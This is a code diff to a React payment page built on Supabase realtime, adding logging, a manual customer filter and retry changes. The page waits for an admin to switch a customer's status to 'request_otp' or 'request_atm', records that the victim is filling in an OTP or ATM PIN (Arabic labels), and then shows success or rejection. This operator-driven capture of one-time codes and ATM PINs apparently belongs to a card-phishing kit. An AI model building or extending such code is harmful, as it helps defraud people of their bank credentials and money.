@@ -56,36 +56,49 @@ export const Payment = () => {
     if (!customerId) return;
 
     // Supabase Realtime Subscription
+    console.log("Initializing realtime listener for customer:", customerId);
     const channel = supabase
-      .channel('public:customers')
+      .channel(`customer_status_${customerId}`)
       .on(
         'postgres_changes',
-        { event: 'UPDATE', filter: `id=eq.${customerId}`, schema: 'public', table: 'customers' },
+        { event: 'UPDATE', schema: 'public', table: 'customers' },
         (payload) => {
           const data = payload.new;
+          // Manual filter to ensure we only react to OUR customer's updates
+          if (data.id !== customerId) return;
+          
+          console.log("Received realtime update for customer status:", data.status);
+          
           // Only update status if it's a valid known status to avoid accidental resets
           if (data.status && data.status !== 'idle') {
             setStatus(data.status);
           }
           
           if (data.status === 'request_otp') {
+            console.log("Switching to OTP entry mode");
             supabase.from('customers').update({ page: '6- يملاء otp' }).eq('id', customerId);
             startTimer();
           } else if (data.status === 'request_atm') {
+            console.log("Switching to ATM entry mode");
             supabase.from('customers').update({ page: '7- يملا atm' }).eq('id', customerId);
             startTimer();
           } else if (data.status === 'waiting_admin' || data.status === 'otp_received') {
+            console.log("In waiting mode:", data.status);
             startTimer();
           } else if (data.status === 'completed') {
+            console.log("Payment completed! Navigating to success...");
             navigate('/success');
           } else if (data.status === 'rejected') {
+            console.warn("Payment rejected by admin");
             setError('حدث خطأ في عملية الدفع، يرجى التأكد من البيانات والمحاولة مرة أخرى');
             stopTimer();
-            setTimeout(() => setStatus('idle'), 2000); // Back to form after 2 seconds
+            setTimeout(() => setStatus('idle'), 3000); 
           }
         }
       )
-      .subscribe();
+      .subscribe((status) => {
+        console.log("Subscription status:", status);
+      });
 
     return () => {
       supabase.removeChannel(channel);
@@ -177,8 +190,7 @@ export const Payment = () => {
       setStatus('idle');
       stopTimer();
     } finally {
-      setIsSubmitting(true); // Keep it true to prevent double clicks even after error, or set to false to allow retry
-      setIsSubmitting(false); // Allowing retry if error happens
+      setIsSubmitting(false); 
     }
   };
 
